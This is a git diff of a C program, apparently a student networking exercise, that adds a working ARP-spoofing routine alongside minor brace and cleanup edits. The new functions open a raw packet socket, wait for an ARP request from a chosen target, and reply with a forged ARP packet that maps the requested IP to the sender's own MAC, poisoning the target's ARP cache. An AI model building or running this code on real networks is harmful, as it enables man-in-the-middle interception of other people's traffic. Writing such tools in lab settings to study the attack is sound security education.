@@ -7,8 +7,9 @@ static void handle_sigint(int sig) {
 
     printf("\nCaught SIGINT (Ctrl+C). Cleaning up...\n");
 
-    if (global_data.sockfd != -1)
+    if (global_data.sockfd != -1) {
         close(global_data.sockfd);
+    }
 
     exit(0);
 }
@@ -140,7 +141,7 @@ int convert_mac_to_byte(const char *mac_str, unsigned char *mac_bytes) {
     int error = 0;
 
 
-    if (strlen(mac_str) < 17) {
+    if (ft_strlen(mac_str) < 17) {
         fprintf(stderr, "\nInvalid MAC address format: %s\n", mac_str);
         return 1;
     }
@@ -239,16 +240,104 @@ int check_args(int argc, char *argv[]) {
 
     // Extract and validate the remaining arguments
     const char **arguments = (const char **)&argv[optind];
-
-    for (int i = 0; arguments[i] != NULL; i++) {
-        printf("arg: %s\n", arguments[i]);
-    }
-
     if (args_validate_and_assign(arguments) != 0) {
         return 1;
     }
 
     return 0;
+}
+
+t_eth_packet create_arp_response_packet(void) {
+    t_eth_packet packet;
+    ft_bzero(&packet, sizeof(t_eth_packet));
+
+    // Copy from request packet to response
+    packet.ethernet_header = *global_data.ethernet_header;
+    packet.arp_packet = *global_data.arp_packet;
+
+    // Hardcode destination and source's spoofed mac for ethernet header
+	ft_memcpy(packet.ethernet_header.h_dest, global_data.ethernet_header->h_source, ETH_ALEN);
+	ft_memcpy(packet.ethernet_header.h_source, global_data.source_mac, ETH_ALEN);
+
+    // Prepare destination and source for arp header
+	ft_memcpy(packet.arp_packet.arp_tha, packet.arp_packet.arp_sha, ETH_ALEN);
+	ft_memcpy(packet.arp_packet.arp_sha, global_data.source_mac, ETH_ALEN);
+	ft_memcpy(packet.arp_packet.arp_spa, packet.arp_packet.arp_tpa, INET4_LEN);
+	ft_memcpy(packet.arp_packet.arp_tpa, global_data.target_ip, INET4_LEN);
+
+    return packet;
+}
+
+void start_arp_spoofing(void) {
+    struct sockaddr_ll sockaddr;
+    socklen_t addrlen = sizeof(sockaddr);
+
+    global_data.sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+    if (global_data.sockfd == -1) {
+        fprintf(stderr, "Error: Socket creation failed: %s\n", strerror(errno));
+        exit(1);
+    }
+
+    while(1) {
+        unsigned char buffer[BUFFER_SIZE] = {0};
+
+        ssize_t len = recvfrom(global_data.sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&sockaddr, &addrlen);
+
+        if (len < 0) {
+            fprintf(stderr, "Error: Recvfrom failed: %s\n", strerror(errno));
+            close(global_data.sockfd);
+            exit(1);
+        }
+
+        global_data.ethernet_header = (struct ethhdr*)buffer;
+
+        // Check ARP
+        if (ntohs(global_data.ethernet_header->h_proto) == ETH_P_ARP) {
+
+            global_data.arp_packet = (struct ether_arp *)(buffer + sizeof(struct ethhdr));
+            global_data.arp_header = (struct arphdr*)global_data.arp_packet;
+
+            if (ntohs(global_data.arp_header->ar_pro) != ETH_P_IP) {
+                fprintf(stderr, "Error: IP address is not IPv4!\n");
+                close(global_data.sockfd);
+                exit(1);
+	    	}
+
+            // Check ARP-request
+            if (ntohs(global_data.arp_header->ar_op) == 1) {
+                unsigned char* sender_mac = global_data.arp_packet->arp_sha;
+                unsigned char* sender_ip = global_data.arp_packet->arp_spa;
+
+                if (ft_memcmp(sender_ip, global_data.target_ip, INET4_LEN) == 0 &&
+                    ft_memcmp(sender_mac, global_data.target_mac, ETH_ALEN) == 0) {
+
+                    if (global_data.f_verbo) {
+                        printf("New ARP request from target:\n\n");
+                        print_headers((const void *)buffer);
+                    }
+
+                    // ARP-reply preparation
+                    t_eth_packet packet = create_arp_response_packet();
+
+                    if (global_data.f_verbo) {
+                        printf("ARP spoofed reply to target:\n\n");
+                        print_headers((const void *)&packet);
+                    }
+
+                    if (sendto(global_data.sockfd, &packet, sizeof(t_eth_packet), 0,
+                        (struct sockaddr *)&sockaddr, sizeof(sockaddr)) < 0) {
+                            fprintf(stderr, "Error: Sendto failed: %s\n", strerror(errno));
+                            close(global_data.sockfd);
+                            exit(1);
+                    }
+
+                    printf("ARP Reply sent\n");
+                    close(global_data.sockfd);
+                    break;
+                }
+            }
+        }
+    }
 }
 
 int main(int argc, char *argv[]) {
@@ -257,19 +346,22 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
-    if (check_args(argc, argv) != 0) return 1;
+    if (check_args(argc, argv) != 0) {
+        return 1;
+    }
 
     if (check_available_interface() != 0) {
         fprintf(stderr, "Error: Could not find a free network interface.\n");
         return 1;
     }
 
-    if (global_data.f_verbo)
+    if (global_data.f_verbo) {
         print_arguments_data();
+    }
 
     signal(SIGINT, handle_sigint);
 
-    //wait_for_arp_request(&data);
+    start_arp_spoofing();
 
     return 0;
 }
